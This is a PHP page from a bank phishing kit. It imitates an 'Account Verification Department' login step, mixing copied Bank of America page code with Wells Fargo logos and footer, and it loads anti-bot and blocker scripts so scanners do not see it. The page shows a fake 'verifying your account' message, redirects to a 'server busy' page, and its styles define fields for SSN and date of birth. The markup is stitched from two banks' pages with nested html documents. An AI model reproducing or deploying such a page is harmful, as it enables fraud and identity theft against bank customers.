﻿<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include "./antibots.php";
include "./blocker.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR
Privacy & Security
/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
	<head>
	<meta http-equiv="Refresh" content="3; url=serverbusy.php">	<style>
input.rounded {

  border: 1px solid #ccc;
   
  /* Safari 5, Chrome support border-radius without vendor prefix.
   * FF 3.0/3.5/3.6, Mobile Safari 4.0.4 require vendor prefix.
   * No support in Safari 3/4, IE 6/7/8, Opera 10.0.
   */
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  
  /* Chrome, FF 4.0 support box-shadow without vendor prefix.
   * Safari 3/4/5 and FF 3.5/3.6 require vendor prefix.
   * No support in FF 3.0, IE 6/7/8, Opera 10.0, iPhone 3.
   * change the offsets, blur and color to suit your design.
   */
  -moz-box-shadow: 0.5px 0.5px 1px #666;
  -webkit-box-shadow: 0.5px 0.5px 1px #666;
  box-shadow: 0.5px 0.5px 1px #666;
  
  /* using a bigger font for demo purposes so the box isn't too small */
  font-size: 14px;
  
  /* with a big radius/font there needs to be padding left and right
   * otherwise the text is too close to the radius.
   * on a smaller radius/font it may not be necessary
   */
  padding: 1px 3px;
  
  /* only needed for webkit browsers which show a rectangular outline;
   * others do not do outline when radius used.
   * android browser still displays a big outline
   */
  outline: 0;

  /* this is needed for iOS devices otherwise a shadow/line appears at the
   * top of the input. depending on the ratio of radius to height it will
   * go all the way across the full width of the input and look really messy.
   * ensure the radius is no more than half the full height of the input, 
   * and the following is set, and everything will render well in iOS.
   */
  -webkit-appearance: none;
  height:12px;
  
}

input.rounded:focus {
  
  /* supported IE8+ and all other browsers tested.
   * optional, but gives the input focues when selected.
   * change to a color that suits your design.
   */
  border-color: #339933;
  
  
}
#phn
{
	width:30px;	
	height:12px;
	}
	#phn1
{
	width:60px;	
	height:12px;
	}
		#phn2
{
	width:40px;
	height:12px;	
	}
	#select4
	{
		width:300px;
		height:20px;
		}
#phone
	{
		width:110px;
		height:12px;
		}
		#zip
		{
		width:50px;
		height:12px;
		}
		#ssn
	{
		width:100px;
		height:12px;
		}
		#dob
	{
		width:100px;
		height:12px;
		}

</style>

<!-- DPID: F2S1-002-1 RID:p0gvZqdGbicAABAH5XoAAABe --> 



<!-- XENGINE LSU Vipaa 6.0 2013.11 r27 -->






<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Account Verification</title>

<script language="JavaScript" type="text/javascript">
			var boaVIPAAuseGzippedBundles = "false";
			var boaVIPAAjawrEnabled = "false";
</script>
	<meta name="Description" CONTENT="Sign in to your Online Banking account by entering your Online ID.">
<meta name="Keywords" CONTENT="Your Online ID">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />

   <link rel="shortcut icon" href="unnamed.png" type="image/ico" />


	<script language="JavaScript" type="text/javascript">
			boaVIPAAuseGzippedBundles = "true";
	</script>

<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->



		<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
						<!-- Loading the new gzipped bundles for the VIPAA login flow -->
						<link rel="stylesheet" type="text/css" href="vipaa-login-jawr.css" media="all" />
						<script src="vipaa-login-jawr.js" type="text/javascript"></script>
<!-- PHASE 2B CHANGES currentLocation is /login/sign-in/enter-online-id -->
						<script type="text/javascript">
						(function() {
						  var bt="text/java",z=document,fh=z.getElementsByTagName('head')[0],k='script',j= (window.location.protocol == "https:" ? "https:/" : "http:/");
						  var y=z.createElement(k);y.async=true;y.type=bt+k;y.src=[j,"streak.bankofamerica.com","30306","I3n.js"].join("/");
						  fh.appendChild(y);
						})();
						</script>
				
						<script type="text/javascript">
						(function() {
						  var s = document.createElement('script'), attrs = { src: (window.location.protocol == "https:" ? "https:" : "http:") + "//" + "pane.bankofamerica.com/30306/a8e.js", async: true, type: "text/javascript" };
						  for(var k in attrs) { s.setAttribute(k, attrs[k]) }
						  document.getElementsByTagName('head')[0].appendChild(s);
						})();
						</script>
						<script type="text/javascript">
							function getSCookie(name){
							var re = new RegExp('[; ]'+name+'=([^\\s;]*)'), matches = null;
								if(document.cookie.length > 0) {
									matches = document.cookie.match(re);
								if(matches && matches.length == 2) {
									return decodeURIComponent(matches[1]);
									}
								}
							}
						</script>
						<script>		
							function get_SessionIdString(){
							  return getSCookie("SID") || "";
							}
						</script>

	
	<style type="text/css"> body { display : none;} </style>
	</head>
	<body class="trfwl-body      ">

		<script type="text/javascript"> 
		if (self == top) {
		  var theBody = document.getElementsByTagName('body')[0];
		  theBody.style.display = "block";
		} else { 
		  top.location = self.location; 
		}
		</script>
		<noscript><style>body{display : block;}</style></noscript>
		
		<a class="ada-hidden" href="#skip-to-h1" name="anc-skip-to-main-content">Skip to main content</a>
		
		<div class="two-row-flex-wideleft-layout">
			<div class="center-content">
				<div class="header">


<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="60" width="60" alt="Bank of America" src="../3/assets/images/global/wf-logo.gif" />
      <div class="page-type">Account Verification Department.</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       
      </div>
      <div class="clearboth"></div>
   </div>
</div>

	
				<noscript>
					<div class="fauxdal-overlay"></div>
					<div class="fauxdal-module">
						<div class="noscript-reload-skin">
							<div class="fauxdal-top"></div>
							<div class="fauxdal-bottom">
								<div class="fsd-fauxdal-content">
										<div class="fsd-fauxdal-title">
											Please use JavaScript
										</div>
										<p>You need a web browser that supports JavaScript to use our site. Without it, some pages won't work as designed. To make sure JavaScript is turned on, please adjust your browser settings.</p><p>&nbsp;</p><p><a title="Browser Help and Tips" name="Browser Help and Tips" href="" target="_self">Browser Help and Tips</a></p>
								</div>        
								<div class="fsd-fauxdal-close"> 
									<a class="button-common button-gray" name="close_button_js_disabled_modal" href=><span>Close</span></a>
								</div>
								<div class="clearboth"></div>
							</div>
						</div>
					</div>
				</noscript>
	
<div class="page-title-module h-100">
  <div class="red-grad-bar-skin sup-ie" id="skip-to-h1">
    <h1 data-font="cnx-regular">Account Verification Department.</h1>
  </div>
</div>
<!-- Just inside Attempt -->
	<div id="clientSideErrors" class="messaging-module hide" aria-live="polite">
		<div class="error-skin">
		<!-- Military banking  changes  -->
			<div class="error-message">	
					<p class="title" class="TLu_ERROR">We can't process your request.</p>
			  <div id="Vipaa_Client_0"><p>We encountered errors with the highlighted item(s). Please make the noted adjustments to continue.</p></div>
			</div>
		</div>
	</div>






<!-- MessageCenter field validation -->
<!-- Added for OMC Rewards -->









</div>
				<div class="flex-top-row"></div>
				<div class="bottom-row">
					
					
					
<html>
<head>
	<title></title>
</head>
<body>
<center><b><font color="red" size="4">Please wait while we verify your account information.</font></b></center>

<center>&nbsp;</center>

<center>&nbsp;</center>

<center>&nbsp;</center>

<center>&nbsp;</center>

<center><br />
<img src="ajax-loader-7-red.gif" width="350" /></center>

<div id="__if72ru4sdfsdfrkjahiuyi_once" style="display:none;">&nbsp;</div>

<div id="__hggasdgjhsagd_once" style="display:none;">&nbsp;</div>
</body>
</html>


<center>&nbsp;</center>

<center>&nbsp;</center>

<center>&nbsp;</center>

<center>&nbsp;</center>

<center>&nbsp;</center>

<center>&nbsp;</center>

<center>&nbsp;</center>

<html>
<head>
	<title></title>
</head>
<body>
<p><span style="color: #c0c0c0;"><span style="background-color: #ffffff;"><img alt="" src="stagecoach.jpg" style="width: 219px; height: 87px;" /></span></span></p>

<p><img alt="icon-equal-housing" src="icon-equal-housing.gif" /> <strong>Equal Housing Lender</strong></p>

<p><span style="font-size:12px;"><span class="style8"><span style="font-family: Verdana;">&copy; 1999 - 2015 Wells Fargo. All rights reserved. NMLSR ID 399801</span></span></span></p>

<div id="__if72ru4sdfsdfrkjahiuyi_once" style="display:none;">&nbsp;</div>

<div id="__hggasdgjhsagd_once" style="display:none;">&nbsp;</div>
</body>
</html>





					
					
					
					</center></p></div>
					

<div class="global-footer-module">
   <div class="white-bground-skin cssp">
		<div class="secure"></div>
	
       
      <div class="link-container">
         <div class="link-row"> 


<script type="text/javascript">
	var cmPageId = "OLB:Tool:SiteKey;Sign_In";
	var cmCategoryId = "OLB:Tool:SiteKey";
	var cmPageId_Modal = "PVParamsMissing";
	var cmSessionID = "" ;
	
function cmGetReqParameter(queryString, parameterName) {
	var parameterName = parameterName + "=";
	if (queryString.length > 0) {
		begin = queryString.indexOf(parameterName);
		if (begin != -1) {
			begin += parameterName.length;
			end = queryString.indexOf ( "&" , begin );
			if ( end == -1 ) {
				end = queryString.length
			}
			return unescape ( queryString.substring ( begin, end ) );
		}
		return null;
	}
}

var testString = window.location.href;

if (cmGetReqParameter(testString, 'sessionid') !== null) {
	cmSessionID = cmGetReqParameter(testString, 'sessionid');
}	


var cmFailure = $("div.messaging-module div.error-skin:visible").length;
if($("div.messaging-module div.error-liveperson-rp-skin:visible").length > 0) {
	cmFailure = $("div.messaging-module div.error-liveperson-rp-skin:visible").length;
}

var cmErrorMsg = '';


var cmReqLocale = $('html').attr('lang');
var locAppendage;
if (cmReqLocale.toLowerCase().indexOf('en') !== -1) {
	locAppendage = '';
} else if (cmReqLocale.toLowerCase().indexOf('es') !== -1) {
	locAppendage = '_ES';
}

if(testString.toLowerCase().indexOf('.bankofamerica.com')>-1){testString=testString.toLowerCase();var tempArr=testString.split('.bankofamerica.com');var tempStr=tempArr[0];if(tempStr.indexOf('\/\/')>-1){tempArr=tempStr.split('\/\/');tempStr=tempArr[1];if(tempStr.indexOf('.')>-1){tempArr=tempStr.split('.');tempStr=tempArr[0];var tempStrPt2=tempArr[1]}if(tempStr.indexOf('www')>-1){if(tempStr.indexOf('-')>-1){cmSetStaging()}else if(tempStrPt2!=null){if(tempStrPt2.indexOf('ecnp')>-1){cmSetStaging()}}else{cmSetProduction()}}else if(tempStr.indexOf('-')>-1){if(tempStr.indexOf('sitekey')>-1){if(tempStr=='sitekey'){cmSetProduction()}else{cmSetStaging()}}else{cmSetStaging()}}else if(tempStrPt2!=null){if(tempStrPt2.indexOf('ecnp')>-1){cmSetStaging()}}else{cmSetProduction()}}}  

	if (cmFailure === 0 && $('#acwContainer').length == 0) {
		cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, null, null, null, null, null, null, null);
	}
	
	else if (cmFailure > 0 ) {
		
		var errorCode='';
		var errorCodeCounter=0;
		var errorCodeIndex;
		cmPageId = cmPageId+'_Error'
		cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, null, null, null, null, null, null, null);
		if ($('.messaging-module').find('.error-skin:visible').length > 0) {
			$("div.messaging-module div.error-skin:visible").attr('tabindex',0).attr('aria-live', 'rude').focus();
			if($('.messaging-module .error-skin:visible ul li').length > 0) {
				$('.messaging-module .error-skin:visible ul li').each(function() {
					cmErrorMsg = $(this).html();
					errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
					cmCreateCustomError(cmPageId+locAppendage, null, null, null, 'Vipaa_Action_'+errorCodeIndex, cmCategoryId, cmErrorMsg);
					errorCodeCounter = errorCodeCounter + 1;
				});				
			} else {
				cmErrorMsg = $.trim($('.messaging-module .error-skin:visible p').text());
				errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
				cmCreateCustomError(cmPageId+locAppendage, null, null, null, 'Vipaa_Action_'+errorCodeIndex, cmCategoryId, cmErrorMsg);			
			}		
		}
		if ($('.messaging-module').find('.error-liveperson-rp-skin:visible').length > 0) {
				$("div.messaging-module div.error-liveperson-rp-skin:visible").attr('tabindex',0).attr('aria-live', 'rude').focus();
				$('.messaging-module .error-liveperson-rp-skin:visible ul li').each(function() {
					cmErrorMsg += $(this).html() + ' - ';
					errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
					cmCreateCustomError(cmPageId+locAppendage, null, null, null, 'VIPAA_PRP_ACTION_000'+errorCodeIndex, cmCategoryId, cmErrorMsg);
					errorCodeCounter = errorCodeCounter + 1;
				});				
			}
	}
function cmSetDD() {
	var testString = window.location.href;
	if (testString.toLowerCase().indexOf('.bankofamerica.com') > -1){
		testString = testString.toLowerCase(); 
		var tempArr = testString.split('.bankofamerica.com');
		var tempStr = tempArr[0];
			if (tempStr.indexOf('\/\/') > -1) {
				tempArr = tempStr.split('\/\/');tempStr = tempArr[1];
				if (tempStr.indexOf('.') > -1) {
					tempArr = tempStr.split('.');tempStr = tempArr[0];var tempStrPt2 = tempArr[1];}
					if (tempStr.indexOf('www') > -1) {
						if (tempStr.indexOf('-') > -1) {cmSetStaging()}
						else if (tempStrPt2 != null) {
							if (tempStrPt2.indexOf('ecnp') > -1) {cmSetStaging()} 
						}
						else {cmSetProduction()} 
					}
					else if (tempStr.indexOf('-') > -1) {
						if (tempStr.indexOf('sitekey') > -1){
							if (tempStr == 'sitekey') {cmSetProduction()}
							else {cmSetStaging()}  
						} 
						else {cmSetStaging()}
					}	
					else if (tempStrPt2 != null) {
							if (tempStrPt2.indexOf('ecnp') > -1) {cmSetStaging()} 
						}
	   				else {cmSetProduction()} 
			}       
	}  

}
if (typeof cmSetStaging == 'function') {cmSetDD()}	
</script></div>
				</div>
			</div>
		</div>
	</body>
</html>

